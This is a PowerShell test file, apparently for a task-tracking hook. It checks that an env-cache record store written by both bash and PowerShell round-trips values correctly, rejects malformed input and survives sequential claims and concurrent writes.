    "$(Set-TaskOwnedRecord -TaskId '77' -Value 'yes')"

# --- 22l: head resolution falls back to git rev-parse ---
$g22GitDir = New-RecordFixture -Name 'headgit'
if (Get-Command git -ErrorAction SilentlyContinue) {
    & git -C $g22GitDir init -q 2>$null | Out-Null
    & git -C $g22GitDir config user.email 'test@test.local' 2>$null | Out-Null
    & git -C $g22GitDir config user.name 'Test' 2>$null | Out-Null
    & git -C $g22GitDir config commit.gpgsign false 2>$null | Out-Null
    Set-Content -Path (Join-Path $g22GitDir 'f.txt') -Value 'x' -Encoding UTF8
    & git -C $g22GitDir add f.txt 2>$null | Out-Null
    & git -C $g22GitDir commit -q -m 'c' 2>$null | Out-Null
    $g22Sha = (& git -C $g22GitDir rev-parse HEAD | Out-String).Trim()
    [System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_42', 'abc123', 'Process')
    $null = Set-TaskHeadRefRecord -TaskId '42'
    # Read back through the FILE reader, not Get-TaskHeadRefFor: TASK_HEAD_REF
    # is one of the two ENV-backed families (the ported asymmetry), so the
    # env-backed reader cannot see a record that was just written to disk.
    Assert-Eq "22l: with no -Head it records the repo's actual HEAD" $g22Sha `
        (Read-TaskRecord -Key (Get-TaskHeadRefKey -TaskId '42')).Value
} else {
    Write-Host "  SKIP: 22l: head resolution needs git" -ForegroundColor Yellow
}

# --- 22m: TASK_BASE_AT is digits-only ---
$null = New-RecordFixture -Name 'baseat'
Assert-Eq "22m: a non-numeric epoch is refused" "False" "$(Set-TaskBaseAtRecord -TaskId '42' -Epoch 'abc')"
$null = Set-TaskBaseAtRecord -TaskId '42'
$g22Now = (Get-TaskBaseAtRecord -TaskId '42')
Assert-Eq "22m: the default epoch is recorded and is digits-only" "True" `
    "$($g22Now.Found -and $g22Now.Value -match '^[0-9]+$')"

# --- 22n: CR/LF/NUL are refused (the deliberate divergence from bash) ---
$null = New-RecordFixture -Name 'newline'
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_42', 'abc123', 'Process')
$g22Bad = 0
foreach ($v in @("a`nb", "a`rb", "a$([char]0)b")) {
    if (Set-TaskNarrowedRecord -TaskId '42' -Value $v) { $g22Bad++ }
}
Assert-Eq "22n: a value with CR, LF or NUL is refused rather than written" "0" "$g22Bad"
Assert-Eq "22n: and nothing was written for the key" "False" "$((Get-TaskNarrowedRecord -TaskId '42').Found)"

# --- 22o: the cross-executor promise — bash sources what PowerShell wrote ---
if ($g22Bash) {
    $null = New-RecordFixture -Name 'crossexec'
    [System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_42', 'abc123', 'Process')
    $null = Set-TaskHeadRefRecord -TaskId '42' -Head 'cafebabe1234'
    $g22Read = (& bash -c '. "$1" > /dev/null 2>&1; printf %s "$TASK_HEAD_REF_42"' _ $script:EnvCache 2>$null | Out-String).TrimEnd("`r", "`n")
    Assert-Eq "22o: bash sources a ps1-written record back to the bare value" "cafebabe1234" $g22Read
} else {
    Write-Host "  SKIP: 22o: the source-back leg needs bash" -ForegroundColor Yellow
}

# --- 22o2: the on-disk BYTES, asserted on EVERY host ---
# These two guard a shared primitive every cache write goes through, and they
# must run where the divergence can actually occur. Nesting them under the bash
# guard made them unrunnable on Windows PowerShell 5.1 — the ONLY host that can
# produce a BOM or a CRLF — while on pwsh 7 a BOM is impossible by construction,
# so the assertion was vacuously true wherever it did run. Neither needs bash.
$null = New-RecordFixture -Name 'bytes'
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_42', 'abc123', 'Process')
$null = Set-TaskHeadRefRecord -TaskId '42' -Head 'cafebabe1234'
$null = Set-TaskNarrowedRecord -TaskId '42' -Value 'no'
$g22Bytes = [System.IO.File]::ReadAllBytes($script:EnvCache)
Assert-Eq "22o2: the cache carries no UTF-8 BOM for bash to choke on" "False" `
    "$($g22Bytes.Length -ge 3 -and $g22Bytes[0] -eq 0xEF -and $g22Bytes[1] -eq 0xBB -and $g22Bytes[2] -eq 0xBF)"
# A CR before any LF would break bash's ^KEY='...'$ shape check AND survive a
# source into the value itself — TASK_BASE_REF would reach git as "<sha>`r".
$g22Crs = 0
for ($i = 1; $i -lt $g22Bytes.Length; $i++) {
    if ($g22Bytes[$i] -eq 0x0A -and $g22Bytes[$i - 1] -eq 0x0D) { $g22Crs++ }
}
Assert-Eq "22o2: and no CRLF line endings, which bash's shape check would reject" "0" "$g22Crs"

# --- 22o3: the REVERSE direction — a bash-written record read by the ps1 ---
# 22o proves ps1 -> bash. The cache is shared in BOTH directions in a mixed
# checkout, and a one-way test would miss an escaping or encoding divergence
# that only appears when bash is the writer. The line is produced by bash's own
# sq_escape, so this asserts against the real reference rather than a guess at
# its output.
if ($g22Bash) {
    $null = New-RecordFixture -Name 'bashwritten'
    foreach ($probe in @('yes', 'abc123..def456', '__stride_no_own_commits__')) {
        $escaped = (& bash -c '. "$1" > /dev/null 2>&1; sq_escape "$2"' _ $g22Sh $probe 2>$null | Out-String).TrimEnd("`r", "`n")
        [System.IO.File]::WriteAllText($script:EnvCache, "TASK_OWNED_42=$escaped`n", (New-Object System.Text.UTF8Encoding($false)))
        $back = Get-TaskOwnedRecord -TaskId '42'
        Assert-Eq "22o3: a bash-escaped record round-trips into the ps1 reader [$probe]" $probe "$($back.Value)"
    }
} else {
    Write-Host "  SKIP: 22o3: the bash-writes/ps1-reads direction needs bash" -ForegroundColor Yellow
}

# --- 22o4: the cross-executor promise for the REMAINING two families ---
# testing_strategy.coverage_target asks for all four writable families to carry
# BOTH a round-trip and a cross-executor assertion. 22e round-trips all four,
# but cross-executor coverage stopped at TASK_HEAD_REF (22o) and TASK_OWNED
# (22f, 22o3): TASK_NARROWED and TASK_BASE_AT had neither direction. These add
# both directions for both families, which closes the target.
if ($g22Bash) {
    # ps1 writes -> bash sources. TASK_BASE_AT is digits, TASK_NARROWED is
    # yes/no; both are sourced back as bare values or the promise is broken.
    $null = New-RecordFixture -Name 'crossexec2'
    [System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_42', 'abc123', 'Process')
    $null = Set-TaskNarrowedRecord -TaskId '42' -Value 'yes'
    $null = Set-TaskBaseAtRecord -TaskId '42' -Epoch '1700000000'
    $g22N = (& bash -c '. "$1" > /dev/null 2>&1; printf %s "$TASK_NARROWED_42"' _ $script:EnvCache 2>$null | Out-String).TrimEnd("`r", "`n")
    Assert-Eq "22o4: bash sources a ps1-written TASK_NARROWED back to the bare value" "yes" $g22N
    $g22A = (& bash -c '. "$1" > /dev/null 2>&1; printf %s "$TASK_BASE_AT_42"' _ $script:EnvCache 2>$null | Out-String).TrimEnd("`r", "`n")
    Assert-Eq "22o4: bash sources a ps1-written TASK_BASE_AT back to the bare value" "1700000000" $g22A
    # And bash's own shape-checked reader agrees they are records, not just
    # sourceable lines — the stricter of the two bash-side answers.
    $g22NRead = (& bash -c '. "$1" > /dev/null 2>&1; ENV_CACHE="$2" read_task_record TASK_NARROWED_42' _ $g22Sh $script:EnvCache 2>$null | Out-String).TrimEnd("`r", "`n")
    Assert-Eq "22o4: and bash's read_task_record accepts the ps1-written shape" "yes" $g22NRead

    # bash WRITES the file -> ps1 reads. 22o3 covers this direction for the
    # escaping, but its file is written by .NET WriteAllText, so the encoding
    # and terminator half of the direction was untested. Here the cache is
    # produced by bash's OWN write_env_cache, through its real key builders and
    # sq_escape, so the bytes are bash's from end to end.
    $g22Dir = New-RecordFixture -Name 'bashwrites'
    $g22Wrote = (& bash -c '
        . "$1" > /dev/null 2>&1
        PROJECT_DIR="$2"; ENV_CACHE="$2/.stride-env-cache"
        export TASK_BASE_REF_42=abc123
        record_task_owned 42 "aaa111..bbb222"
        record_task_narrowed 42 no
        { grep -v -e "^$(task_base_at_key 42)=" "$ENV_CACHE" 2>/dev/null || true
          printf "%s=%s\n" "$(task_base_at_key 42)" "$(sq_escape 1700000042)"
        } | write_env_cache
        printf OK
    ' _ $g22Sh $g22Dir 2>$null | Out-String).TrimEnd("`r", "`n")
    if ($g22Wrote -eq 'OK') {
        Assert-Eq "22o4: a bash-written TASK_OWNED reads back through the ps1" "aaa111..bbb222" `
            "$((Get-TaskOwnedRecord -TaskId '42').Value)"
        Assert-Eq "22o4: a bash-written TASK_NARROWED reads back through the ps1" "no" `
            "$((Get-TaskNarrowedRecord -TaskId '42').Value)"
        Assert-Eq "22o4: a bash-written TASK_BASE_AT reads back through the ps1" "1700000042" `
            "$((Get-TaskBaseAtRecord -TaskId '42').Value)"
        # The bytes bash produced must satisfy the same two invariants 22o2
        # holds the ps1 writer to — otherwise "shared cache" is only true in
        # one direction.
        $g22BwBytes = [System.IO.File]::ReadAllBytes($script:EnvCache)
        Assert-Eq "22o4: the bash-written cache carries no BOM either" "False" `
            "$($g22BwBytes.Length -ge 3 -and $g22BwBytes[0] -eq 0xEF -and $g22BwBytes[1] -eq 0xBB -and $g22BwBytes[2] -eq 0xBF)"
        $g22BwCrs = 0
        for ($i = 1; $i -lt $g22BwBytes.Length; $i++) {
            if ($g22BwBytes[$i] -eq 0x0A -and $g22BwBytes[$i - 1] -eq 0x0D) { $g22BwCrs++ }
        }
        Assert-Eq "22o4: and no CRLF terminators the ps1 reader would call absent" "0" "$g22BwCrs"
    } else {
        Write-Host "  SKIP: 22o4: bash could not stage its own cache write" -ForegroundColor Yellow
    }

    # A quote-bearing probe in the bash-writes direction. 22o3's three probes
    # are all quote-free, so the escaped form is just 'value' and the escaper
    # is never exercised on the read side. This one is the documented [^']*
    # limit seen from the OTHER executor: bash writes it, and the ps1 must
    # agree it is ABSENT rather than reading half of it.
    $g22QDir = New-RecordFixture -Name 'bashwritesquote'
    # The quote-bearing value is passed as an ARGUMENT, never embedded in this
    # script text: a literal ' inside a PowerShell single-quoted string ends it.
    $g22QWrote = (& bash -c '
        . "$1" > /dev/null 2>&1
        PROJECT_DIR="$2"; ENV_CACHE="$2/.stride-env-cache"
        record_task_narrowed 42 "$3"
        printf OK
    ' _ $g22Sh $g22QDir "a'b" 2>$null | Out-String).TrimEnd("`r", "`n")
    if ($g22QWrote -eq 'OK') {
        Assert-Eq "22o4: a bash-written quote-bearing value is ABSENT to the ps1, as it is to bash" "False" `
            "$((Get-TaskNarrowedRecord -TaskId '42').Found)"
        $g22QBash = (& bash -c '. "$1" > /dev/null 2>&1; ENV_CACHE="$2"; if read_task_record TASK_NARROWED_42 > /dev/null 2>&1; then printf FOUND; else printf ABSENT; fi' _ $g22Sh $script:EnvCache 2>$null | Out-String).TrimEnd("`r", "`n")
        Assert-Eq "22o4: and bash reads its own write as absent too — the same limit, both sides" "ABSENT" $g22QBash
    } else {
        Write-Host "  SKIP: 22o4: bash could not stage the quote probe" -ForegroundColor Yellow
    }
} else {
    Write-Host "  SKIP: 22o4: both cross-executor directions need bash" -ForegroundColor Yellow
}

# --- 22p: two sequential claims, and what the outer task's records survive ---
# testing_strategy.integration_tests[0] — "two sequential claims leave the outer
# task's records intact". 10k already drives ONE claim down the UNPARSEABLE
# branch and pins all five families surviving. This covers the PARSEABLE branch,
# which is the normal path and the one that was untested, across TWO claims.
#
# THE RE-EMIT LANDED IN W2102, AND THIS TEST FLIPPED WITH IT. It was written in
# W2101 to pin the gap by value and to fail loudly the moment someone closed it,
# which is exactly what happened: wiring Get-CarriedWindowRecordLine turned the
# four not-survive assertions red in the same commit that made them wrong.
#
# What carries them is the RE-EMIT shape - Read-TaskRecord + ConvertTo-
# ShSingleQuoted, per surviving base record - never a raw-line copy and never a
# widened preservation filter. That distinction is the whole point: reading
# through the strict record shape means a forged continuation is not a record
# and is dropped, where a widened filter would carry it through untouched.
if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "  SKIP: 22p: two sequential claims need git" -ForegroundColor Yellow
} else {
    $g22Seq = New-GitRepo -Name 'g22-sequential-claims'
    # The OUTER task (77) holds one record in each of the five families, seeded
    # exactly as 10k seeds them — the state a nested claim must not erase.
    Set-Content -Path (Join-Path $g22Seq '.stride-env-cache') -Encoding UTF8 -Value @"
TASK_ID=77
TASK_IDENTIFIER=W77
TASK_BASE_REF_77='aaaa111'
TASK_HEAD_REF_77='bbbb222'
TASK_OWNED_77='cccc333'
TASK_BASE_AT_77='1786846260'
TASK_NARROWED_77='yes'
"@
    $g22ClaimInner = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = '{"data":{"id":88,"identifier":"W88","title":"Inner","status":"in_progress","complexity":"small","priority":"high"}}'; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $g22ClaimThird = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = '{"data":{"id":99,"identifier":"W99","title":"Third","status":"in_progress","complexity":"small","priority":"high"}}'; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $g22ClaimInner -Phase 'post' -ProjectDir $g22Seq
    Assert-Exit "22p: the first parseable claim exits 0" 0 $r.ExitCode
    $r = Invoke-HookScript -InputJson $g22ClaimThird -Phase 'post' -ProjectDir $g22Seq
    Assert-Exit "22p: the second parseable claim exits 0" 0 $r.ExitCode
    $g22SeqCache = @(Get-Content -Path (Join-Path $g22Seq '.stride-env-cache') -Encoding UTF8 -ErrorAction SilentlyContinue)

    # The property that DOES hold, and the one D226 exists to provide: the outer
    # task's base anchor survives both claims, with its VALUE intact — a nested
    # claim never erases the anchor another task's diff is measured from.
    Assert-Eq "22p: the outer task's base record survives two sequential claims" "1" `
        "$(@($g22SeqCache | Where-Object { $_ -like 'TASK_BASE_REF_77=*' }).Count)"
    Assert-Contains "22p: and its VALUE is the outer task's, not the claimant's" `
        "TASK_BASE_REF_77='aaaa111'" "$($g22SeqCache -join "`n")"
    # Identity belongs to the NEWEST claim — the window moved on.
    Assert-Contains "22p: identity is the most recent claim's" "TASK_ID='99'" "$($g22SeqCache -join "`n")"

    # The four partner families now survive, pinned BY VALUE - a count alone
    # would pass on a record that was carried across but mangled in transit.
    foreach ($p in @(
        @{ Key = 'TASK_HEAD_REF_77';  Line = "TASK_HEAD_REF_77='bbbb222'" },
        @{ Key = 'TASK_OWNED_77';     Line = "TASK_OWNED_77='cccc333'" },
        @{ Key = 'TASK_BASE_AT_77';   Line = "TASK_BASE_AT_77='1786846260'" },
        @{ Key = 'TASK_NARROWED_77';  Line = "TASK_NARROWED_77='yes'" }
    )) {
        Assert-Eq "22p: $($p.Key) survives two sequential claims" "1" `
            "$(@($g22SeqCache | Where-Object { $_ -like "$($p.Key)=*" }).Count)"
        Assert-Contains "22p: and $($p.Key) survives with its VALUE intact" `
            $p.Line "$($g22SeqCache -join "`n")"
    }
    # NO ORPHAN: every partner record must have a surviving base record for the
    # SAME id. Partners are derived from the base lines that survived, so this
    # holds by construction - asserted anyway, because the construction is what
    # a future edit would break, and an orphaned head record is a half-bounded
    # window. Checked by id rather than by hard-coding 77: the claiming task
    # legitimately gains its own TASK_BASE_AT_ stamp, which is not an orphan.
    $g22BaseIds = @($g22SeqCache |
        Where-Object { $_ -match '^TASK_BASE_REF_([0-9]+)=' } |
        ForEach-Object { if ($_ -match '^TASK_BASE_REF_([0-9]+)=') { $Matches[1] } })
    $g22Orphans = @($g22SeqCache |
        Where-Object { $_ -match '^TASK_(?:HEAD_REF|OWNED|BASE_AT|NARROWED)_([0-9]+)=' } |
        Where-Object {
            $null = $_ -match '^TASK_(?:HEAD_REF|OWNED|BASE_AT|NARROWED)_([0-9]+)='
            $g22BaseIds -notcontains $Matches[1]
        })
    Assert-Eq "22p: every surviving partner record still has its base - no orphans" "0" `
        "$($g22Orphans.Count)"
}

# --- 22q: the selector's TWO PRODUCTION CALL SITES, end-to-end ---
# Group 25 drives Select-KeptWindowRecord directly, through AST extraction, and
# 10k/22p drive the real claim path - but over a ONE-window cache, which
# survives the new selector and the old tail cap alike. Reverting either call
# site to `Select-Object -Last 19/20` therefore left the whole suite green: the
# FUNCTION was pinned and its WIRING was not. That is the same shape as the
# round-1 finding (a correct function whose production consumer was never
# reached), and it is why this exists as the end-to-end form of 25d.
#
# 23 OPEN windows with LIVE bases, oldest first. Open windows are never capped,
# so all 23 must survive; a tail cap keeps only the newest 19 or 20 and drops
# the OLDEST - precisely where a live enclosing outer task sits.
#
# WHICH CLAIM REACHES WHICH SITE, measured by mutating each site alone:
#   parseable   -> BOTH. The claim-response rewrite (which appends no base of
#                  its own, so it reserves no slot and caps at 20) and then
#                  Invoke-FinalizeBeforeDoing (which appends the claimant's own
#                  base, reserves that key, and caps at 19).
#   unparseable -> the finalize site only; the rewrite branch needs a response
#                  it can parse.
# Capping the rewrite site fails the parseable case only; capping the finalize
# site fails both. The unparseable case is therefore what separates them - with
# the parseable one alone, a tail cap at either site would look the same.
if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "  SKIP: 22q: the selector's call sites need git" -ForegroundColor Yellow
} else {
    foreach ($g22q in @(
        @{ Name = 'parseable';   Stdout = '{"data":{"id":99,"identifier":"W99","title":"Claimant","status":"in_progress","complexity":"small","priority":"high"}}' },
        @{ Name = 'unparseable'; Stdout = 'Internal Server Error' }
    )) {
        $g22qDir = New-GitRepo -Name "g22q-$($g22q.Name)"
        # Live, resolvable bases: the sweep fires at 23 open windows and must
        # prove every one of them ALIVE, so nothing here is evicted for being
        # dead and the only question left is the cap.
        $g22qHead = (& git -C $g22qDir rev-parse HEAD 2>$null | Out-String).Trim()
        $g22qLines = New-Object System.Collections.Generic.List[string]
        $g22qLines.Add("TASK_ID=77") | Out-Null
        $g22qLines.Add("TASK_IDENTIFIER=W77") | Out-Null
        # The OUTER task first, i.e. oldest - the position a tail cap drops.
        $g22qLines.Add("TASK_BASE_REF_77='$g22qHead'") | Out-Null
        for ($i = 101; $i -le 122; $i++) {
            $g22qLines.Add("TASK_BASE_REF_$i='$g22qHead'") | Out-Null
        }
        Set-Content -Path (Join-Path $g22qDir '.stride-env-cache') -Encoding UTF8 -Value $g22qLines
        $g22qClaim = @{
            tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
            tool_response = @{ stdout = $g22q.Stdout; stderr = ''; interrupted = $false }
        } | ConvertTo-Json -Compress
        $r = Invoke-HookScript -InputJson $g22qClaim -Phase 'post' -ProjectDir $g22qDir
        Assert-Exit "22q ($($g22q.Name)): the claim exits 0" 0 $r.ExitCode
        $g22qCache = @(Get-Content -Path (Join-Path $g22qDir '.stride-env-cache') -Encoding UTF8 -ErrorAction SilentlyContinue)
        Assert-Contains "22q ($($g22q.Name)): the OLDEST open window survives the rewrite by value" `
            "TASK_BASE_REF_77='$g22qHead'" "$($g22qCache -join "`n")"
        Assert-Eq "22q ($($g22q.Name)): and so do all 22 newer open windows - none capped" "22" `
            "$(@($g22qCache | Where-Object { $_ -match '^TASK_BASE_REF_1[0-2][0-9]=' }).Count)"
    }
}

# --- 22r: the record writers' call-site INVENTORY ---
# W2101 shipped this as a tripwire on "no production call site", with the
# instruction to UPDATE it rather than delete it when G413 added one. W2102 did,
# so it is now an inventory: a per-writer expected count, and a recorded
# provenance for every call's VALUE. What it defends has not changed - the
# original point was that server input must not reach a record - but the way it
# defends it has. A count of zero could only say "nobody calls these"; the
# inventory says "these are the callers, and here is where each value comes
# from", so an UNREVIEWED new call site, in particular one whose value comes off
# the API response, breaks the test.
#
# PROVENANCE, all locally derived, none server-supplied:
#   Set-TaskOwnedRecord    1 - Invoke-FinalizeAfterDoing. Value is
#                              Get-OwnedCommitSet over a locally observed HEAD
#                              delta, i.e. git rev-list output.
#   Set-TaskNarrowedRecord 3 - two in Invoke-FinalizeAfterDoing (the literal
#                              'no' pre-capture default, and the locally
#                              computed verdict after it) and, since W2103, one
#                              in Invoke-SelfHealChangedFilesUpload writing the
#                              verdict the RETRY actually applied. All three
#                              values are locally derived; none is server-fed.
#                              The retry's value is deliberately the APPLIED
#                              verdict rather than the replayed one - a replayed
#                              'yes' whose owned range came back empty uploaded
#                              WIDE, and recording 'yes' there would make the
#                              record false about the snapshot the server holds.
#                              That call sits OUTSIDE the non-refused branch, as
#                              bash's unconditional pair does: a refused base
#                              uploads '[]', which is narrowed by nothing, so it
#                              records 'no' rather than leaving the replayed
#                              value on the record untouched.
#   Set-TaskHeadRefRecord  1 - Invoke-FinalizeAfterDoing, no -Head argument, so
#                              the value is git rev-parse HEAD.
#   Set-TaskBaseAtRecord   0 - the claim stamp is written INLINE into
#                              Invoke-FinalizeBeforeDoing's line array, as bash
#                              also does. Calling the writer there would re-read
#                              and rewrite the file mid-construction of the very
#                              array about to be written. Asserted at 0 so its
#                              continued lack of a caller is a recorded fact
#                              rather than an unnoticed one.
# COMMENT LINES DO NOT COUNT. The parity note names these writers in prose, and
# a raw occurrence count reads that as four call sites — which is how this
# tripwire first fired on its own documentation. Skip comment lines, then
# subtract the one definition each.
$g22CodeLines = @(Get-Content -Path $HookScript | Where-Object { $_.TrimStart() -notlike '#*' })
foreach ($w in @(
    @{ Name = 'Set-TaskOwnedRecord';    Expect = 1 },
    @{ Name = 'Set-TaskNarrowedRecord'; Expect = 3 },
    @{ Name = 'Set-TaskHeadRefRecord';  Expect = 1 },
    @{ Name = 'Set-TaskBaseAtRecord';   Expect = 0 }
)) {
    $hits = @($g22CodeLines | Where-Object { $_ -match [regex]::Escape($w.Name) }).Count
    Assert-Eq "22r: $($w.Name) has exactly $($w.Expect) production call site(s)" `
        "$($w.Expect)" "$($hits - 1)"
}

# --- 22t (D282): a concurrent write is not clobbered by a record write ---
# W2102 gave the record writers their first production call sites, all inside
# Invoke-FinalizeAfterDoing, which runs twice per completion and holds a read
# across Build-ChangedFilesSnapshot — a git shell-out. A claim from a second
# agent in the same checkout landing in that window used to be lost wholesale,
# because Set-TaskRecord read the whole cache, filtered one key and rewrote the
# file with no check that anything had moved underneath it.
#
# The interleave is staged deterministically rather than raced: a real
# concurrent writer would make this test timing-dependent and flaky, and what
# needs proving is the GUARD, not the scheduler. Each case captures the
# fingerprint a record write would have taken, mutates the cache the way the
# other process would, and then completes the write.
$null = New-RecordFixture -Name 'concurrent'

# 22t-a: the guard fires. A write staged against a stale read must refuse.
[System.IO.File]::WriteAllText($script:EnvCache, "TASK_OWNED_9='mine'`n", (New-Object System.Text.UTF8Encoding($false)))
$g22Before = Get-EnvCacheRawByte
Assert-Eq "22t-a (D282): the fingerprint was taken and the cache is readable" "True" `
    "$($null -ne $g22Before -and -not ($g22Before -is [string]))"
# The other process commits its claim between our read and our rename.
[System.IO.File]::WriteAllText($script:EnvCache, "TASK_ID='999'`nTASK_IDENTIFIER='W999'`n", (New-Object System.Text.UTF8Encoding($false)))
$g22Rc = Write-EnvCache -Lines @("TASK_OWNED_9='ours'") -ExpectBytes $g22Before -CompareAndSwap
Assert-Eq "22t-a (D282): a write staged against a stale read is refused" "changed" "$g22Rc"
$g22AfterA = (Get-EnvCacheLine) -join '|'
Assert-Contains "22t-a (D282): and the concurrent claim's record survives untouched" "TASK_ID='999'" $g22AfterA
if ($g22AfterA -match "TASK_OWNED_9='ours'") {
    Write-Host "  FAIL: 22t-a (D282): the refused write reached the cache anyway" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 22t-a (D282): and the refused write did not reach the cache" -ForegroundColor Green
    $script:PASS++
}

# 22t-b: a REAL interleave, and the case acceptance criterion 3 rests on.
#
# An earlier version of this case wrote the concurrent claim and only THEN
# called Set-TaskNarrowedRecord, so the record write read the already-updated
# cache, the compare-and-swap passed on attempt 1 and the retry never ran. Its
# exact sequence passed against the pre-D282 tree, which makes it no regression
# pin at all. Sequencing alone cannot produce this race: the concurrent write
# has to land BETWEEN the record write's read and its rename.
#
# The injection POINT matters as much as its existence, and a second draft got
# that wrong too. Shadowing Get-EnvCacheRawByte lands the concurrent write after
# the FINGERPRINT but before Split-EnvCacheRecord re-reads, so attempt 1 already
# stages fresh content and the retry, though it runs, carries nothing: measured
# against a mutant with the guard deleted, that version still passed 5/5. The
# write has to land after the SPLITTER has read, so the staged line set is
# genuinely stale and only the swap can save the claim. Shadowing
# Split-EnvCacheRecord puts it there.
$null = New-RecordFixture -Name 'interleave'
[System.IO.File]::WriteAllText($script:EnvCache, "TASK_BASE_REF_9='abc123'`nTASK_OWNED_9='mine'`n", (New-Object System.Text.UTF8Encoding($false)))
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_9', 'abc123', 'Process')
$script:g22Injected = 0
$g22RealSplit = ${function:Split-EnvCacheRecord}
function Split-EnvCacheRecord {
    $recs = & $g22RealSplit
    if ($script:g22Injected -eq 0) {
        $script:g22Injected = 1
        # The other agent's claim commits AFTER we have read the records we are
        # about to stage, so the line set we build is already stale when it is
        # written. Only the compare-and-swap can save the claim from here.
        [System.IO.File]::WriteAllText($script:EnvCache,
            "TASK_BASE_REF_9='abc123'`nTASK_OWNED_9='mine'`nTASK_ID='999'`nTASK_IDENTIFIER='W999'`n",
            [System.Text.Encoding]::GetEncoding(28591))
    }
    return $recs
}
$g22SetRc = Set-TaskNarrowedRecord -TaskId '9' -Value 'yes'
${function:Split-EnvCacheRecord} = $g22RealSplit
Assert-Eq "22t-b (D282): the interleave actually fired" "1" "$($script:g22Injected)"
Assert-Eq "22t-b (D282): the record write still reports success after retrying" "True" "$g22SetRc"
$g22Inter = (Get-EnvCacheLine) -join '|'
Assert-Contains "22t-b (D282): the concurrent claim's TASK_ID survives the interleave" "TASK_ID='999'" $g22Inter
Assert-Contains "22t-b (D282): and its TASK_IDENTIFIER survives too" "TASK_IDENTIFIER='W999'" $g22Inter
Assert-Eq "22t-b (D282): and the record write landed alongside it" "yes" `
    "$((Get-TaskNarrowedRecord -TaskId '9').Value)"

# 22t-g (D289): the SHARED guard, exercised through Invoke-EnvCacheRewrite
# itself. D282 gave the compare-and-swap to Set-TaskRecord alone; D289 moved the
# retry into this helper and routed the other five Write-EnvCache callers
# through it, so this is now the one mechanism every rewrite on this side
# depends on. Pinning it here pins all six.
#
# Same injection point and the same reason as 22t-b: the concurrent write must
# land AFTER the Build has read, or the staged line set is never stale and the
# swap has nothing to catch. Shadowing Get-EnvCacheRawByte would put it before
# the splitter and the case would pass with the guard deleted.
#
# MUTATION-TESTED, not merely observed green: with `-CompareAndSwap` removed
# from the helper's Write-EnvCache call, the two survival assertions below go
# red (the concurrent claim's lines are gone from the committed cache), and with
# the retry `continue` replaced by a `return $false` the retry-fired assertion
# goes red as well. Both were confirmed before this case was trusted.
$null = New-RecordFixture -Name 'casguard'
[System.IO.File]::WriteAllText($script:EnvCache, "BOARD_ID='55'`nTASK_OWNED_7='mine'`n", (New-Object System.Text.UTF8Encoding($false)))
$script:g22CasInjected = 0
$script:g22CasBuilds = 0
$g22CasRealSplit = ${function:Split-EnvCacheRecord}
function Split-EnvCacheRecord {
    $recs = & $g22CasRealSplit
    if ($script:g22CasInjected -eq 0) {
        $script:g22CasInjected = 1
        # A second agent's claim commits here - after this Build has read the
        # records it is about to stage, before the rename it will attempt.
        [System.IO.File]::WriteAllText($script:EnvCache,
            "BOARD_ID='55'`nTASK_OWNED_7='mine'`nTASK_ID='4242'`nTASK_IDENTIFIER='W4242'`n",
            [System.Text.Encoding]::GetEncoding(28591))
    }
    return $recs
}
# A Build in the shape every real caller uses: read through the splitter, drop
# one key, append a replacement.
$g22CasRc = Invoke-EnvCacheRewrite -What 'the 22t-g probe' -Build {
    param($before)
    $script:g22CasBuilds++
    $recs = Split-EnvCacheRecord
    if (-not $recs.Ok) { throw 'env cache ends inside a quoted value' }
    $kept = @($recs.Records | Where-Object { $_ -notmatch '^BOARD_NAME=' })
    return @(@($kept) + @("BOARD_NAME='probe'"))
}
${function:Split-EnvCacheRecord} = $g22CasRealSplit
Assert-Eq "22t-g (D289): the interleave actually fired" "1" "$($script:g22CasInjected)"
Assert-Eq "22t-g (D289): the swap detected it and the Build ran a second time" "2" "$($script:g22CasBuilds)"
Assert-Eq "22t-g (D289): the guarded rewrite still reports success" "True" "$g22CasRc"
$g22CasOut = (Get-EnvCacheLine) -join '|'
Assert-Contains "22t-g (D289): the concurrent claim's TASK_ID survives the rewrite" "TASK_ID='4242'" $g22CasOut
Assert-Contains "22t-g (D289): and its TASK_IDENTIFIER survives too" "TASK_IDENTIFIER='W4242'" $g22CasOut
Assert-Contains "22t-g (D289): and the rewrite's own line landed alongside it" "BOARD_NAME='probe'" $g22CasOut

# 22t-h (D289): a Build that refuses aborts the write outright - no attempt, no
# partial commit, previous cache intact. This is the path every caller's
# `throw 'env cache ends inside a quoted value'` takes, and before D289 those
# throws reached an enclosing catch instead; the helper must preserve the same
# outcome rather than committing whatever the failed filter produced.
$null = New-RecordFixture -Name 'casrefuse'
[System.IO.File]::WriteAllText($script:EnvCache, "BOARD_ID='55'`n", (New-Object System.Text.UTF8Encoding($false)))
$g22RefuseRc = Invoke-EnvCacheRewrite -What 'the 22t-h probe' -Build { param($before) throw 'nope' }
Assert-Eq "22t-h (D289): a Build that throws reports failure" "False" "$g22RefuseRc"
Assert-Eq "22t-h (D289): and the previous cache is untouched" "BOARD_ID='55'" "$((Get-EnvCacheLine) -join '|')"
# Returning nothing is NOT a refusal - it is an empty line set, and it must
# commit. PowerShell unrolls @() to $null on the way out of a scriptblock, so
# reading "returned nothing" as "refused" would have made the claim block's
# delete-on-empty branch unreachable. Throwing is the only refusal.
$g22NullRc = Invoke-EnvCacheRewrite -What 'the 22t-h empty probe' -Build { param($before) return @() }
Assert-Eq "22t-h (D289): a Build returning an empty set commits, it does not refuse" "True" "$g22NullRc"
Assert-Eq "22t-h (D289): and the cache is now empty rather than untouched" "" "$((Get-EnvCacheLine) -join '|')"

# 22t-i (D289): -DeleteWhenEmpty, the claim block's preserve-or-delete branch.
# An empty result means "remove the cache" there, and an unguarded Remove-Item
